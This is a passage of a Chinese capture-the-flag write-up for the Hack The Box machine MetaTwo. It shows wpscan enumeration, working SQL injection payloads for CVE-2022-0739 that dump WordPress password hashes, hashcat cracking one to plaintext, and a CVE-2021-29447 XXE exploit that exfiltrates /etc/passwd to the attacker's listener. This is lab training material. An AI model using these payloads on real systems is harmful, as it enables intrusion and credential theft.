found: http://metapress.htb/robots.txt</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Interesting Entries:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - /wp-admin/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - /wp-admin/admin-ajax.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Robots Txt (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://metapress.htb/readme.html</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 60%</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentytwentyone</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://metapress.htb/wp-content/themes/twentytwentyone/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2024-07-16T00:00:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 2.3</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Style Name: Twenty Twenty-One</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Style URI: https://wordpress.org/themes/twentytwentyone/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Author: the WordPress team</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Author URI: https://wordpress.org/</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Css Style In 404 Page (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 1.1 (80% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Style (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: &#x27;Version: 1.1&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:17 &lt;============================================================================&gt; (137 / 137) 100.00% Time: 00:00:17</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Mon Sep 23 17:49:02 2024</span><br><span class="hljs-string">[+] Requests Done: 186</span><br><span class="hljs-string">[+] Cached Requests: 7</span><br><span class="hljs-string">[+] Data Sent: 52.054 KB</span><br><span class="hljs-string">[+] Data Received: 21.794 MB</span><br><span class="hljs-string">[+] Memory used: 280.602 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:32</span><br></code></pre></td></tr></table></figure>
+
+<p>6、扫描出的信息并没有多大的收获，但是在网页浏览时发现了一个页面</p>
+<p><code>http://metapress.htb/author/admin/</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、在这个页面上发现了一个新的目录地址，开始访问该地址</p>
+<p><code>http://metapress.htb/events/</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、通过在这个页面上枚举，发现该页面上泄露了网站使用的一个插件信息</p>
+<p><code>view-source:http://metapress.htb/events/</code></p>
+<p><code>http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_tel_input.js?ver=1.0.10</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、然后我们继续使用wpscan工具，专门扫描下这个网站上的这个插件的漏洞</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//metapress.htb/</span> <span class="hljs-params">--plugins-detection</span> aggressive<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">[i] Plugin(s) Identified:<br><br>[+] bookingpress-appointment-booking<br> | Location: http:<span class="hljs-regexp">//m</span>etapress.htb<span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/bookingpress-appointment-booking/</span><br> | Last Updated: <span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">22</span>T10:<span class="hljs-number">09</span>:<span class="hljs-number">00.000</span>Z<br> | Readme: http:<span class="hljs-regexp">//m</span>etapress.htb<span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/bookingpress-appointment-booking/</span>readme.txt<br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.1</span>.<span class="hljs-number">11</span><br> |<br> | Found By: Known Locations (Aggressive Detection)<br> |  - http:<span class="hljs-regexp">//m</span>etapress.htb<span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/bookingpress-appointment-booking/</span>, status: <span class="hljs-number">200</span><br> |<br> | Version: <span class="hljs-number">1.0</span>.<span class="hljs-number">10</span> (<span class="hljs-number">100</span>% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http:<span class="hljs-regexp">//m</span>etapress.htb<span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/bookingpress-appointment-booking/</span>readme.txt<br> | Confirmed By: Translation File (Aggressive Detection)<br> |  - http:<span class="hljs-regexp">//m</span>etapress.htb<span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/bookingpress-appointment-booking/</span>languages/bookingpress-appointment-booking-en_US.po, Match: <span class="hljs-string">&#x27;sion: BookingPress Appointment Booking v1.0.10&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>10、查看漏洞介绍页面，发现这是一个SQL注入漏洞</p>
+<p><code>https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">该插件未能在通过 bookingpress_front_get_category_services AJAX 操作（可供未经身份验证的用户使用）动态构造 <span class="hljs-keyword">SQL</span> 查询之前正确清理用户提供的 POST 数据，从而导致未经身份验证的 <span class="hljs-keyword">SQL</span> 注入<br><br>BookingPress <span class="hljs-operator">&lt;</span> <span class="hljs-number">1.0</span><span class="hljs-number">.11</span> <span class="hljs-operator">-</span> 未经身份验证的 <span class="hljs-keyword">SQL</span> 注入<br><br>CVE<span class="hljs-number">-2022</span><span class="hljs-number">-0739</span><br></code></pre></td></tr></table></figure>
+
+<p>11、使用漏洞详情页的POC进行漏洞尝试</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -i <span class="hljs-string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> \<br>  <span class="hljs-comment">--data &#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#x27;</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-keyword">Server</span>: nginx/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span><br><span class="hljs-type">Date</span>: Mon, <span class="hljs-number">23</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-number">57</span> GMT<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br><span class="hljs-keyword">Connection</span>: keep-alive<br>X-Powered-<span class="hljs-keyword">By</span>: PHP/<span class="hljs-number">8.0</span><span class="hljs-number">.24</span><br>X-Robots-Tag: noindex<br>X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span>: nosniff<br>Expires: Wed, <span class="hljs-number">11</span> Jan <span class="hljs-number">1984</span> <span class="hljs-number">05</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br><span class="hljs-keyword">Cache</span>-Control: no-<span class="hljs-keyword">cache</span>, must-revalidate, max-age=<span class="hljs-number">0</span><br>X-Frame-<span class="hljs-keyword">Options</span>: SAMEORIGIN<br>Referrer-<span class="hljs-keyword">Policy</span>: <span class="hljs-keyword">strict</span>-origin-<span class="hljs-keyword">when</span>-<span class="hljs-keyword">cross</span>-origin<br><br>&#123;&quot;variant&quot;:&quot;error&quot;,&quot;title&quot;:&quot;Error&quot;,&quot;msg&quot;:&quot;Sorry, Your request can not process due to security reason.&quot;&#125; <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -i <span class="hljs-string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> \<br>  <span class="hljs-comment">--data &#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#x27;</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-keyword">Server</span>: nginx/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span><br><span class="hljs-type">Date</span>: Mon, <span class="hljs-number">23</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">12</span>:<span class="hljs-number">09</span>:<span class="hljs-number">31</span> GMT<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br><span class="hljs-keyword">Connection</span>: keep-alive<br>X-Powered-<span class="hljs-keyword">By</span>: PHP/<span class="hljs-number">8.0</span><span class="hljs-number">.24</span><br>X-Robots-Tag: noindex<br>X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span>: nosniff<br>Expires: Wed, <span class="hljs-number">11</span> Jan <span class="hljs-number">1984</span> <span class="hljs-number">05</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br><span class="hljs-keyword">Cache</span>-Control: no-<span class="hljs-keyword">cache</span>, must-revalidate, max-age=<span class="hljs-number">0</span><br>X-Frame-<span class="hljs-keyword">Options</span>: SAMEORIGIN<br>Referrer-<span class="hljs-keyword">Policy</span>: <span class="hljs-keyword">strict</span>-origin-<span class="hljs-keyword">when</span>-<span class="hljs-keyword">cross</span>-origin<br><br>&#123;&quot;variant&quot;:&quot;error&quot;,&quot;title&quot;:&quot;Error&quot;,&quot;msg&quot;:&quot;Sorry, Your request can not process due to security reason.&quot;&#125; <br></code></pre></td></tr></table></figure>
+
+<p>12、这里并没有奏效，但是根据引导模式，就是这个漏洞的，我们使用GITHUB上的一个EXP脚本进行漏洞尝试</p>
+<p><code>https://github.com/viardant/CVE-2022-0739</code></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl">┌──(kali㉿offsec)-[~<span class="hljs-regexp">/Desktop]</span><br><span class="hljs-regexp">└─$ python3 booking-sqlinjector.py -u http:/</span><span class="hljs-regexp">/metapress.htb/</span> -a -o db_dump -p <span class="hljs-string">&quot;) UNION ALL SELECT NULL, bookingpress_user_login,  bookingpress_user_first, -42287234, bookingpress_user_lastname, bookingpress_user_phone, NULL, @@VERSION, NULL FROM wp_bookingpress_customers -- asdf-&quot;</span>  -nu http:<span class="hljs-regexp">//m</span>etapress.htb/events/<br><br>████████████████████████████████████████████████████████████████████<br>█─▄▄▄▄█─▄▄▄─█▄─▄█████▄─▄█▄─▀█▄─▄███▄─▄█▄─▄▄─█─▄▄▄─█─▄─▄─█─▄▄─█▄─▄▄▀█<br>█▄▄▄▄─█─██▀─██─██▀████─███─█▄▀─██─▄█─███─▄█▀█─███▀███─███─██─██─▄─▄█<br>▀▄▄▄▄▄▀───▄▄▀▄▄▄▄▄▀▀▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀<br>====================================================================<br>             █▀▀ █░█ █▀▀ ▄▄ ▀█ █▀█ ▀█ ▀█ ▄▄ █▀█ ▀▀█ █▀█<br>             █▄▄ ▀▄▀ ██▄ ░░ █▄ █▄█ █▄ █▄ ░░ █▄█ ░░█ ▀▀█<br>    <br>[*] DB Fingerprint: <span class="hljs-number">10.5</span>.<span class="hljs-number">15</span>-MariaDB-<span class="hljs-number">0</span>+deb11u1<br>[*] Users found: <span class="hljs-number">2</span><br>&#123;<br>  <span class="hljs-string">&quot;admin&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;admin@metapress.htb&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;manager&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;manager@metapress.htb&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>13、成功发现了账号密码信息，然后使用hashcat进行破解</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --user <br><br><span class="hljs-variable">$P</span><span class="hljs-variable">$B4aNM28N0E</span>.tMy/JIcnVMZbGcU16Q70:partylikearockstar<br></code></pre></td></tr></table></figure>
+
+<p>14、然后，我们就可以使用相关账号密码，成功登录后台了。</p>
+<p><code>http://metapress.htb/wp-admin/admin.php</code></p>
+<p><code>http://metapress.htb/wp-admin/</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://metapress.htb/wp-admin/profile.php</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>15、通过检索该框架漏洞版本，发现了一个新的漏洞</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WordPress</span> <span class="hljs-number">5</span>.<span class="hljs-number">6</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">29447</span><br></code></pre></td></tr></table></figure>
+
+<p><code>http://metapress.htb/wp-admin/upload.php</code></p>
+<p><code>http://metapress.htb/wp-admin/media-new.php</code></p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>16、这里通过GITHUB上找到了一个可以利用的EXP脚本</p>
+<p><code>https://github.com/0xRar/CVE-2021-29447-PoC</code></p>
+<p>17、首先尝试了下获取敏感信息的操作利用</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(kali㉿offsec)-[~/<span class="hljs-symbol">Desktop</span>/<span class="hljs-symbol">CVE</span><span class="hljs-number">-2021</span><span class="hljs-number">-29447</span>-<span class="hljs-symbol">PoC</span>-main]<br>└─$ python3 <span class="hljs-symbol">PoC</span>.py -l <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.22</span> -p <span class="hljs-number">8000</span> -f /etc/passwd<br><br>    ╔═╗╦  ╦╔═╗     <br>    ║  ╚╗╔╝║╣────<span class="hljs-number">2021</span><span class="hljs-number">-29447</span><br>    ╚═╝ ╚╝ ╚═╝<br>    <span class="hljs-symbol">Written</span> <span class="hljs-symbol">By</span> (<span class="hljs-symbol">Isa</span> <span class="hljs-symbol">Ebrahim</span> - <span class="hljs-number">0</span>xRar) on <span class="hljs-symbol">January</span>, <span class="hljs-number">2023</span><br><br>    ═══════════════════════════════════════════════════════════════════════════<br>    [*] <span class="hljs-symbol">Title</span>: <span class="hljs-symbol">Wordpress</span> <span class="hljs-symbol">XML</span> parsing issue in the <span class="hljs-symbol">Media</span> <span class="hljs-symbol">Library</span> leading to <span class="hljs-symbol">XXE</span><br>    [*] <span class="hljs-symbol">Affected</span> versions: <span class="hljs-symbol">Wordpress</span> <span class="hljs-number">5.6</span> - <span class="hljs-number">5.7</span><br>    [*] <span class="hljs-symbol">Patched</span> version: <span class="hljs-symbol">Wordpress</span> <span class="hljs-number">5.7</span><span class="hljs-number">.1</span><br>    [*] <span class="hljs-symbol">Installation</span> version: <span class="hljs-symbol">PHP</span> <span class="hljs-number">8</span><br>    ═══════════════════════════════════════════════════════════════════════════<br>    <br>[+] payload.wav was created.<br>[+] evil.dtd was created.<br>[+] manually upload the payload.wav file to the <span class="hljs-symbol">Media</span> <span class="hljs-symbol">Library</span>.<br>[+] wait for the <span class="hljs-symbol">GET</span> request.<br><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">58</span>:<span class="hljs-number">45</span> <span class="hljs-number">2024</span>] <span class="hljs-symbol">PHP</span> <span class="hljs-number">8.2</span><span class="hljs-number">.12</span> <span class="hljs-symbol">Development</span> <span class="hljs-symbol">Server</span> (http://<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">8000</span>) started<br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58292</span> <span class="hljs-symbol">Accepted</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58292</span> [<span class="hljs-number">200</span>]: <span class="hljs-symbol">GET</span> /evil.dtd<br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58292</span> <span class="hljs-symbol">Closing</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58304</span> <span class="hljs-symbol">Accepted</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58304</span> [<span class="hljs-number">404</span>]: <span class="hljs-symbol">GET</span> /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/<span class="hljs-number">8</span><span class="hljs-symbol">BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN</span>/<span class="hljs-symbol">DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc</span>+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/<span class="hljs-symbol">XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk</span>+<span class="hljs-symbol">OYjQ</span>+<span class="hljs-symbol">NqoFkul74jA</span>+<span class="hljs-symbol">QNWiudUSdJtGt44ivtk4</span>/<span class="hljs-symbol">Y</span>/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+<span class="hljs-symbol">DxSGoX8NPiqwNLVkI</span>+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+<span class="hljs-number">63</span>oDFseRRE/<span class="hljs-number">9</span><span class="hljs-symbol">Mfvj8FR2rHPdy3DzGehnMRP</span>+<span class="hljs-symbol">LltfLt2d</span>+<span class="hljs-number">0</span>aI9O9wE34hyve2RND7xT7Fw== - <span class="hljs-symbol">No</span> such file or directory<br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58304</span> <span class="hljs-symbol">Closing</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58318</span> <span class="hljs-symbol">Accepted</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58318</span> [<span class="hljs-number">200</span>]: <span class="hljs-symbol">GET</span> /evil.dtd<br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58318</span> <span class="hljs-symbol">Closing</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58324</span> <span class="hljs-symbol">Accepted</span><br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span 